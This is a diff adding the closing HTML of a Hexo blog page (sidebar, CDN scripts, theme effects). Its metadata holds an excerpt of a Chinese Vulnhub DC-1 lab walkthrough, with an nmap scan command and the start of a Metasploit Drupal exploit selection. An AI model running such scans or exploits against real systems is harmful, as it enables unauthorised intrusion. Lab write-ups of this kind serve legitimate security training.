+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[Vulnhub靶机通关]DC-1",
+          url: "http://example.com/2025/09/15/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]DC-1/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC]  外网渗透  主机发现   探端口及服务 1nmap -A -p- -v 192.168.5.53  123发现开放了22算口，开放了ssh服务，OpenSSH 6.0p1发现开放了80端口，存在web服务，Apache httpd 2.2.22，Drupal 7发现开放了111端口，开放了rpcbind服务   MSF攻击 Drupal 7之前碰到过一个，是有漏洞的，直接用MSF打 1234search drupaluse exploit/unix/webapp/drupal_dr",
+          date: "Mon Sep 15 2025 16:03:11 GMT+0800",
+          updated: "Wed Mar 18 2026 15:36:17 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
